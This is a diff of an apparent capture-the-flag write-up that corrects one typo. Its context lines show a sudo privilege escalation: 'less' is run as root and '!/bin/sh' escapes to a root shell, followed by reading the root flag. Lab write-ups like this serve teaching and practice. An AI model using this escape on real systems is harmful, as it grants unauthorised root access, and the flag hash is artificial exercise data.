@@ -35,7 +35,7 @@ sudo -l
 sudo less /etc/profile 
 !/bin/sh 
 ```
-Finish of with cating out the root flag
+Finish off with cating out the root flag
 ```
 cat /root/root.txt  
 3a9f0ea7bb98050796b649e85481845
